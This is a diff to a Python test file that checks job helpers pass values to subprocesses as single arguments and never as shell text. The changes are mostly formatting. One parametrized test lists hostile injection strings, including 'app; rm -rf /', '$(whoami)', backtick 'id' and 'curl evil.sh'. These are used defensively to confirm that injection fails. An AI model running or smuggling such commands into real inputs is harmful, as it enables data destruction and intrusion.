@@ -1,4 +1,5 @@
 """The job helpers — especially that values never reach the shell as text."""
+
 import subprocess
 
 import pytest
@@ -35,7 +36,7 @@ def test_systemctl_chain_ignore_failures_uses_semicolons():
 
 @pytest.mark.parametrize(
     "hostile",
-    ['app; rm -rf /', 'app$(whoami)', 'app`id`', 'app && curl evil.sh', "app' OR '1"],
+    ["app; rm -rf /", "app$(whoami)", "app`id`", "app && curl evil.sh", "app' OR '1"],
 )
 def test_hostile_values_survive_as_single_arguments(hostile):
     """A value that slipped past validation still reaches echo as one word."""
@@ -64,9 +65,7 @@ def test_launch_title_defaults_to_label(fake_runner, audit_log):
 
 
 def test_launch_bash_builds_a_sourcing_command(fake_runner, audit_log):
-    jobs.launch_bash(
-        "install_nginx", script="nginx.sh", label="Install NGINX", audit_action="tool.install"
-    )
+    jobs.launch_bash("install_nginx", script="nginx.sh", label="Install NGINX", audit_action="tool.install")
     cmd = fake_runner.last_cmd
     assert cmd[0] == "bash"
     assert cmd[-2:] == [str(cmd[-2]), "install_nginx"]
